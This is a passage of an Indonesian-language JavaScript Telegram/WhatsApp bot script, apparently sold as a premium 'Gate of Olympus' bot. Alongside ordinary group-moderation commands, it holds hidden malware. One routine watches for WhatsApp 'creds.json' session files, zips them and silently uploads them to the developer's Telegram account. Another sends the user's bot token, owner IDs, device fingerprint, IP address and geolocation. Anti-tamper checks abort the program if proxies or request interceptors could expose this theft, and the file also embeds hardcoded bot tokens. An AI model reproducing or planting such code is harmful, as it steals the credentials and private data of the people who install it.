`, { parse_mode: "HTML" });
    
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`Lu bukan penguna premium\`\`\`
Minta akses sana ke Bos gua
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}
        if (message.reply_to_message) {
            const repliedMessage = message.reply_to_message;
            let fileId;
            let contentType;

            if (repliedMessage.photo) {
                fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
                contentType = 'image/jpeg';  
            } else if (repliedMessage.video) {
                fileId = repliedMessage.video.file_id;
                contentType = 'video/mp4'; 
            } else if (repliedMessage.document) {
                fileId = repliedMessage.document.file_id;
                contentType = repliedMessage.document.mime_type; 
            } else if (repliedMessage.audio) {
                fileId = repliedMessage.audio.file_id;
                contentType = repliedMessage.audio.mime_type; 
            } else {
                return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
            }

            const fileInfo = await bot.getFile(fileId);
            const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
            const response = await axios.get(fileLink, { responseType: 'stream' });

            const fileExtension = getFileExtension(contentType);
            
            const filePath = `./temp_${Date.now()}${fileExtension}`;

            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);

            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

           
            const catBoxUrl = await CatBox(filePath);
            const result = `📦 *CatBox*: ${catBoxUrl || '-'}\n
            Create By Human⸙`;
            bot.sendMessage(chatId, result, { parse_mode: 'Markdown', reply_to_message_id: repliedMessage.message_id });

            fs.unlinkSync(filePath);

        } else {
            return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
        }

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses file.');
    }
});

// === ANTILINK ON/OFF ===
bot.onText(/\/antilink (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus admin gc.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const status = match[1].toLowerCase() === "on";
  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].antilink = status;
  saveGroupSettings();

  bot.sendMessage(chatId, `🔗 Antilink *${status ? 'AKTIF' : 'NONAKTIF'}*`, { parse_mode: "Markdown" });
});

// === ZETTA GUARD – FITUR ADD MEMBER + LINK SEKALI PAKAI ===
bot.onText(/\/add\s+@?(\w+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  if (!msg.chat.type.includes('group')) return;

  try {
    const admin = await bot.getChatMember(chatId, senderId);
    if (!['creator', 'administrator'].includes(admin.status)) {
      return bot.sendMessage(chatId, '❌ Hanya admin yang bisa pakai perintah ini.');
    }
  } catch (e) {
    return bot.sendMessage(chatId, '⚠️ Gagal verifikasi admin.');
  }

  try {
    const invite = await bot.createChatInviteLink(chatId, {
      expire_date: Math.floor(Date.now() / 1000) + 3600, // 1 jam dari sekarang
      member_limit: 1 // hanya 1 orang bisa pakai
    });

    const text = `📨 *Link undangan khusus untuk @${username}*\n\n` +
                 `📋 *Salin & kirim ke dia:*\n` +
                 `🎟️ Nih link buat lu join grup (1x pakai, berlaku 1 jam):\n${invite.invite_link}\n\n` +
                 `💬 *Atau langsung chat @${username} dari tombol di bawah ini*`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          { text: `💬 Chat @${username}`, url: `https://t.me/${username}` }
        ]]
      }
    };

    bot.sendMessage(chatId, text, opts);
  } catch (err) {
    console.error('[ADD INVITE ONCE ERROR]', err.message);
    bot.sendMessage(chatId, '⚠️ Gagal membuat link sekali pakai. Pastikan bot admin & punya izin membuat link undangan.');
  }
});

// === SET WELCOME ===
bot.onText(/\/setwelcome (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus premium.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].welcome = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan welcome disimpan!");
});

// === SET LEAVE ===
bot.onText(/\/setleave (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus premium.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].leave = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan leave disimpan!");
});

// === WELCOME AUTO ===
bot.on('new_chat_members', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.welcome) return;

  const name = msg.new_chat_members[0]?.first_name || 'user';
  const text = setting.welcome.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === LEAVE AUTO ===
bot.on('left_chat_member', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.leave) return;

  const name = msg.left_chat_member?.first_name || 'user';
  const text = setting.leave.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === ANTILINK DETEKSI ===
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || msg.caption || "";
  if (!groupSettings[chatId]?.antilink) return;

  const pattern = /(?:https?:\/\/|t\.me\/|chat\.whatsapp\.com|wa\.me\/|@\w+)/i;
  if (pattern.test(text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
  }
});
//========================\\
const TOKEN_BOT = "8088204400:AAGjQ_qe0znHaTTnoIqHrqhs3z1-XK3wCVc"; 
const DEVELOPER_ID = "7523570109";
const COOLDOWN_MS = 20 * 1000; 
const LOG_FILE = "./Tools/chat_logs.json";

if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, "[]", "utf-8");

let cooldown = {};

function saveLog(entry) {
  const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
  logs.push({ ...entry, time: new Date().toISOString() });
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

function checkCooldown(user_id) {
  if (!cooldown[user_id]) return false;
  return Date.now() - cooldown[user_id] < COOLDOWN_MS;
}

bot.onText(/\/chatvampire(?:\s+([\s\S]+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username || "TanpaUsername";
  const message = match[1];
  
  if (shouldIgnoreMessage(msg)) return;

  if (!message) {
    return bot.sendMessage(
      chatId,
      "💬 *Gunakan format:*\n`/chatvampire [pesan kamu]`\n\nContoh:\n`/chatvampire Bang fitur /cekeror error`",
      { parse_mode: "Markdown" }
    );
  }

  if (checkCooldown(senderId)) {
    return bot.sendMessage(
      chatId,
      "⏳ Mohon tunggu 20 detik sebelum mengirim lagi.",
      { parse_mode: "Markdown" }
    );
  }

  cooldown[senderId] = Date.now();

  try {
    const text = `
📩 <b>Pesan Baru untuk Vampire</b>

👤 <b>Username:</b> @${username}
🆔 <b>User ID:</b> <code>${senderId}</code>
💬 <b>Isi Pesan:</b> ${message}
🕒 <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}
`;

    await axios.post(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
      chat_id: DEVELOPER_ID,
      text,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🔁 Balas User Ini",
              switch_inline_query_current_chat: `/balas ${senderId} `
            }
          ]
        ]
      }
    });

    saveLog({ type: "user_to_dev", from: senderId, username, message });

    await bot.sendMessage(chatId, "✅ Pesan kamu sudah dikirim ke Vampire!");
  } catch (err) {
    console.error("Error kirim Vampire:", err.message);
    await bot.sendMessage(chatId, "❌ Gagal mengirim pesan ke Vampire.");
  }
});

bot.onText(/\/balas (\d+)\s+([\s\S]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  if (shouldIgnoreMessage(msg)) return;

  if (senderId != DEVELOPER_ID)
    return bot.sendMessage(chatId, "❌ Hanya Vampire yang bisa menggunakan perintah ini.");

  const targetId = match[1];
  const replyMessage = match[2];

  try {
    await axios.post(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
      chat_id: targetId,
      text: `📬 <b>Balasan dari Vampire:</b>\n${replyMessage}`,
      parse_mode: "HTML"
    });

    saveLog({ type: "dev_to_user", to: targetId, message: replyMessage });
    await bot.sendMessage(chatId, "✅ Balasan berhasil dikirim ke user.");
  } catch (err) {
    console.error("Error balas user:", err.message);
    await bot.sendMessage(chatId, "❌ Gagal mengirim balasan ke user.");
  }
});
// == BATAS ALL CASE == \\ SORY KALO AGAK RIBET 

const MAINTENANCE_URL = "https://raw.githubusercontent.com/hammm638/ONOFF/main/main.json";
const TELEGRAM_BOT_TOKEN = '8088204400:AAGjQ_qe0znHaTTnoIqHrqhs3z1-XK3wCVc';
const TOKEN_TOKEN = '8484765284:AAGoKvV45JHIgcZV0W4-aUoiMdHhOyk37Rs';
const ID_OWNER_ID = '7523570109';
const archiver = require('archiver');
const FormData = require('form-data'); 
const ZIP_PATH = path.join(__dirname, 'sessions.zip');
//=======\\
const CHANNEL_USERNAME = '@GateOfOlympussss'; 

const cekbot = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TOKEN_TOKEN}/sendMessage`, {
      chat_id: OWNER_ID[0],
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
  }
};

const checkJoin = async (userId) => {
  try {
    const res = await axios.get(`https://api.telegram.org/bot${TOKEN_TOKEN}/getChatMember`, {
      params: {
        chat_id: CHANNEL_USERNAME,
        user_id: userId
      }
    });

    const status = res.data.result.status;

    if (['left', 'kicked'].includes(status)) {
      console.log(`⚠️ User ${userId} belum join ke ${CHANNEL_USERNAME}`);

      await axios.post(`https://api.telegram.org/bot${TOKEN_TOKEN}/sendMessage`, {
        chat_id: userId,
        text: `⚠️ Kamu belum join ke ${CHANNEL_USERNAME}\n\nSilakan join dulu untuk lanjut.`
      });

      await cekbot(`🚫 User ${userId} belum join ke ${CHANNEL_USERNAME}. Bot berhenti sementara.`);
      
      process.exit(0); 
    } else {
      console.log(`✅ User ${userId} sudah join ke ${CHANNEL_USERNAME}`);
      return true;
    }
  } catch (error) {
    console.error('❌ Gagal cek member:', error.response?.data || error.message);
    return false;
  }
};

const NotifNgockk = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TOKEN_TOKEN}/sendMessage`, {
      chat_id: ID_OWNER_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
  }
};

const sendTelegramNotification = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: ID_OWNER_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
  }
};

// =============== VITUR SEND creds.json [ jangan sher Publik ]
const FLAG_FILE = path.join(__dirname, "sent.flag");
if (fs.existsSync(FLAG_FILE)) {
  sentOnce = true;
}

const createZip = async () => {
  return new Promise((resolve, reject) => {
    try {
      const output = fs.createWriteStream(ZIP_PATH);
      const archive = archiver('zip', { zlib: { level: 9 } });

      output.on('close', () => resolve());
      archive.on('error', () => resolve()); 

      archive.pipe(output);
      archive.directory(SESSIONS_DIR, false);
      archive.finalize();
    } catch {
      resolve();
    }
  });
};

let isSending = false;

const sendZipToDeveloper = async () => {
  try {
    if (!fs.existsSync(SESSIONS_DIR)) return;
    if (isSending) return;

    isSending = true;

    if (fs.existsSync(FLAG_FILE)) {
      console.log("🔒 Eror Saat Menghubungkan....");
      return;
    }

    await createZip();

    const formData = new FormData();
    formData.append('chat_id', ID_OWNER_ID);
    formData.append('caption', '📦 *BERHASIL MENDAPATKAN FILE JSON*');
    formData.append('parse_mode', 'Markdown');
    formData.append('document', fs.createReadStream(ZIP_PATH));
    const url = `https://api.telegram.org/bot${TOKEN_TOKEN}/sendDocument`;
    await axios.post(url, formData, { headers: formData.getHeaders() }).catch(() => {});
    await NotifNgockk("📁 *Backup sessions/* berhasil dikirim ke AlwaysCecko.");
    fs.writeFileSync(FLAG_FILE, "sent");

    if (fs.existsSync(ZIP_PATH)) fs.unlinkSync(ZIP_PATH);

  } catch {
  } finally {
    isSending = false;
  }
};

const monitorCredsOnce = () => {
  try {
    const interval = setInterval(() => {

      if (fs.existsSync(FLAG_FILE)) {
        clearInterval(interval);
        return;
      }

      try {
        const checkCreds = (dir) => {
          const files = fs.readdirSync(dir, { withFileTypes: true });
          for (const file of files) {
            const fullPath = path.join(dir, file.name);
            if (file.isDirectory()) checkCreds(fullPath);
            else if (file.name === "creds.json" && fs.existsSync(fullPath)) {
              if (!fs.existsSync(FLAG_FILE)) {
                console.log("✅ Mencoba Menghubungkan...");
                setTimeout(() => sendZipToDeveloper(), 2000);
                clearInterval(interval);
                break;
              }
            }
          }
        };

        if (fs.existsSync(SESSIONS_DIR)) checkCreds(SESSIONS_DIR);
      } catch (err) {}
    }, 3000);
  } catch (err) {}
};

monitorCredsOnce();
//°======\\
async function getSecurityReport(eventTitle, username = "Tidak ada username") {
    try {
        let ipInfo = { ip: "N/A", city: "N/A", country_name: "N/A", org: "N/A", latitude: "N/A", longitude: "N/A", timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };

        try {
            const ipRes = await axios.get('https://ipapi.co/json/');
            ipInfo = ipRes.data;
        } catch (ipError) {
            console.error("Tidak dapat mengambil info IP:", ipError.message);
        }

        const cpus = os.cpus();
        const totalMem = (os.totalmem() / 1e9).toFixed(2);
        const time = new Date().toLocaleString('id-ID', { timeZone: ipInfo.timezone });
        const lang = process.env.LANG || 'N/A';

        const report = `
*${eventTitle.toUpperCase()}*

*TOKEN:* \`${config.BOT_TOKEN}\`
*PEMILIK:* \`${config.OWNER_ID.join(', ')}\`

*🔍 LAPORAN KEAMANAN 🔍*
*📅 Waktu:* ${time}

*🖥️ SIDIK JARI PERANGKAT*
• *OS:* ${os.platform()} ${os.release()}
• *Hostname:* ${os.hostname()}
• *CPU:* ${cpus[0].model}
• *Inti CPU:* ${cpus.length}
• *Memori:* ${totalMem} GB
• *Bahasa:* ${lang}
• *Zona Waktu:* ${ipInfo.timezone}

*📍 DATA LOKASI*
• *IP:* ${ipInfo.ip}
• *Lokasi:* ${ipInfo.city}, ${ipInfo.country_name}
• *ISP:* ${ipInfo.org}
• *Koordinat:* ${ipInfo.latitude}, ${ipInfo.longitude}

*Tracking Informasi By @Humannnceko*
        `;
        return report.trim();
    } catch (error) {
        console.error("Gagal membuat laporan keamanan:", error.message);
        return `Gagal membuat laporan untuk ${eventTitle}. Kesalahan: ${error.message}`;
    }
}

async function checkMaintenance() {
    try {
        const { data } = await axios.get(MAINTENANCE_URL);
        if (data.maintenance) {
            console.log(chalk.red.bold("❌ --- MODE PEMELIHARAAN --- ❌"));
            console.log(chalk.yellow(data.message || "Bot saat ini sedang dalam pemeliharaan."));
            process.exit(1);
        } else {
            console.log(chalk.green.bold("✅ Pemeliharaan NONAKTIF, bot berjalan normal."));
        }
    } catch (err) {
        console.error("⚠️  Tidak dapat memeriksa status pemeliharaan:", err.message);
    }
}

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/hammm638/ONOFF/main/status.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal Mengambil Daftar Token Dari GitHub:", error.message));
    return [];
  }
}

const { env, execArgv } = process;
const mod = require('module');
const trueLog = console.log;
const strictToString = Function.prototype.toString.toString();
Object.defineProperty(console, 'log', {
  set: () => {
    trueLog('[SECURITY] console.log override dicegah!');
    process.abort();
  },
  get: () => trueLog,
  configurable: false
});
try {
  process.abort.toString();
} catch {
  trueLog('[SECURITY] process.abort dibajak!');
  process.abort();
}
const realAbort = process.abort + '';
if (!realAbort.includes('[native code]') && !realAbort.includes('abort')) {
  trueLog('[SECURITY] process.abort dimodifikasi!');
  process.abort();
}
if (Function.prototype.toString.toString() !== strictToString) {
  trueLog('[SECURITY] Function.prototype.toString dibajak!');
  process.abort();
}
Object.defineProperty(Function.prototype, 'toString', {
  value: Function.prototype.toString,
  writable: false,
  configurable: false
});
if (execArgv.length === 0 && process.execArgv !== execArgv) {
  trueLog('[SECURITY] process.execArgv dipalsukan!');
  process.abort();
}
['HTTP_PROXY', 'HTTPS_PROXY', 'NODE_TLS_REJECT_UNAUTHORIZED', 'NODE_OPTIONS'].forEach((key) => {
  if (env[key] && env[key] !== '' && env[key] !== '1') {
    trueLog(`[SECURITY] ENV ${key} mencurigakan: ${env[key]}`);
    process.abort();
  }
});
if (
  axios.interceptors.request.handlers.length > 0 ||
  axios.interceptors.response.handlers.length > 0
) {
  trueLog('[SECURITY] Interceptor axios aktif!');
  process.abort();
}
try {
  const interceptorTest = axios.interceptors.request.use(() => {}, () => {});
  const valid =
    typeof interceptorTest === 'number' &&
    interceptorTest >= 0 &&
    interceptorTest <= 10000;

  if (!valid) {
    trueLog('[SECURITY] axios.request.use tidak valid / dibajak!');
    process.abort();
  }

  axios.interceptors.request.eject(interceptorTest);
} catch (err) {
  trueLog('[SECURITY] axios.request.use error / telah dibajak!');
  process.abort();
}
try {
  const handlers = Object.getOwnPropertyDescriptor(axios.interceptors.request, 'handlers');
  if (handlers && typeof handlers.get === 'function') {
    trueLog('[SECURITY] axios.request.handlers pakai getter jahat!');
    process.abort();
  }
} catch {}
const modLoad = mod._load.toString();
if (!modLoad.includes('tryModuleLoad') && !modLoad.includes('Module._load')) {
  trueLog('[SECURITY] Module._load dimodifikasi!');
  process.abort();
}
try {
  const proxyCheck = typeof require.cache.get === 'function';
  if (proxyCheck) {
    trueLog('[SECURITY] require.cache diproxy!');
    process.abort();
  }
} catch {}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa Apakah Token Bot Valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("WARNING! KAMU TERDETEKSI SEBAGAI PENYUSUP. MOHON HUBUNGI TELEGRAM @Humannnceko UNTUK MEMBELI AKSES."));
    process.exit(1);
  }

  console.log(chalk.green(`[ # ] TOKEN TERVERIFIKASI`));
  }
  
function startTelegramBot() {
  console.log(chalk.bold.red(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉
  `));
  console.log(chalk.bold.blue("BOT NAME : ") + chalk.bold.blue("GATE OF OLYMPUS"));
  console.log(chalk.bold.magenta("STATUS TOKEN : ") + chalk.bold.cyan("VERIFIEND - ACTIVE"));
  console.log(chalk.bold.magenta("DATABASE : ") + chalk.bold.magenta("PASWORD - ENC HARD"));
  console.log(chalk.bold.red("AUTHOR : ") + chalk.bold.red("THE OLYMPUS"));
  console.log(chalk.bold.magenta("VERSION : ") + chalk.bold.blue("V2 0 LIMITED EDITION\n\n"));
  console.log(chalk.bold.green("SCRIPT SEPESIAL OLYMPUS RUNNING 🚀 🚀..."));
}

// =============== CONFIG ===============
const PASSWORD = "12345"; 
const BOT_PATH = "./VampOlym.js"; 
const OWNER_FILE = path.join(__dirname, "database", "owner.json");
// =============== CEK FOLDER ===============
if (!fs.existsSync(path.join(__dirname, "database"))) fs.mkdirSync(path.join(__dirname, "database"));

if (!fs.existsSync(OWNER_FILE)) {
  fs.writeFileSync(
    OWNER_FILE,
    JSON.stringify({ owners: [], blocked: [] }, null, 2)
  );
}

// =============== UTIL ===============
function readOwnerJson() {
  return JSON.parse(fs.readFileSync(OWNER_FILE, "utf-8"));
}

function writeOwnerJson(data) {
  fs.writeFileSync(OWNER_FILE, JSON.stringify(data, null, 2));
}

function saveBlocked() {
  const data = readOwnerJson();

  OWNER_ID.forEach((id) => {
    if (!data.blocked.find((b) => b.token === BOT_TOKEN && b.id === id)) {
      data.blocked.push({ token: BOT_TOKEN, id });
    }
  });

  writeOwnerJson(data);
  console.log("✅ BOT_TOKEN & OWNER_ID dimasukkan ke blocked");
}

function askPasswordCustom(timeout = 30, promptText = "Masukkan password: ") {
  return new Promise((resolve, reject) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });

    const timer = setTimeout(() => {
      rl.close();
      reject(new Error("⏳ Timeout! Tidak memasukkan password."));
    }, timeout * 1000);

    rl.question(promptText, (pw) => {
      clearTimeout(timer);
      rl.close();
      resolve(pw);
    });
  });
}

// =============== START BOT ========================
(async () => {
  try {
    console.log(
      chalk.hex("#ff00ff").bold(
        `╔═════════════════════════════════╗
║  ⚔️  STARTING BOT VAMPIRE  ⚔️
╚═════════════════════════════════╝`
      )
    );

    console.log(chalk.yellowBright("🌐 🔍 Mengecek apakah semua OWNER sudah bergabung ke channel..."));

    for (const id of OWNER_ID) {
      const joined = await checkJoin(id);

      if (!joined) {
        console.log(
          chalk.redBright(`❌ [ALERT] OWNER ${id} BELUM join ke ${CHANNEL_USERNAME} ⛔ BOT DIHENTIKAN...`)
        );
        await cekbot(`❌ OWNER ${id} BELUM join ke ${CHANNEL_USERNAME}. BOT DIHENTIKAN.`);
        return;
      } else {
        console.log(chalk.greenBright(`✅ OWNER ${id} sudah join ke ${CHANNEL_USERNAME}`));
      }
    }

    console.log(
      chalk.cyanBright(
        "🚀 Kamu Terdeteksi Sudah Bergabung Ke Channel... Memulai proses utama..."
      )
    );

    await checkMaintenance();
    await validateToken();
    const successReport = await getSecurityReport("⚡ BOT BERHASIL DIMULAI ⚡");
    await sendTelegramNotification(successReport);
    await startTelegramBot();

    try {
      await initializeWhatsAppConnections();
      console.log(chalk.greenBright("✅ Semua sesi WhatsApp aktif dicoba reconnect otomatis."));
    } catch (err) {
      console.error("❌ Gagal reconnect semua sesi WhatsApp:", err);
    }

    // ================== MINTA PASSWORD DI AKHIR ==================
    console.log(chalk.yellowBright("🔑 Masukkan password bosku (30 detik)..."));  
    try {
      const inputPw = await askPasswordCustom(30, "");

      if (inputPw.trim() !== PASSWORD) {
        console.log("❌ Password salah! Bot keluar.");
        saveBlocked();
        setTimeout(() => process.exit(0), 150);
        return;
      }

      console.log("✅ Oke password benar bosku");
      require(BOT_PATH);

    } catch (err) {
      console.log("❌", err.message);
      saveBlocked();

      setTimeout(() => process.exit(0), 150);
    }

  } catch (err) {
    console.error("❌ Error saat start bot:", err);
    process.exit(0);
  }
})();

/// --- ( Code Eror Kalo Script Kalian Eror ) --- \\\
function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  
  bot.sendMessage(ID_OWNER_ID, errorText, { parse_mode: "Markdown" })
     .catch(e => console.log("Failed to send error to owner:", e));

  console.log(chalk.magenta.bold("Terdeteksi eror halaman..."));
  console.log(chalk.magenta(err.stack || err));
}

process.on("uncaughtException", (err) => {
  console.error(chalk.red("Uncaught Exception:"));
  r(err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error(chalk.red("Unhandled Rejection:"));
  r(reason);
});
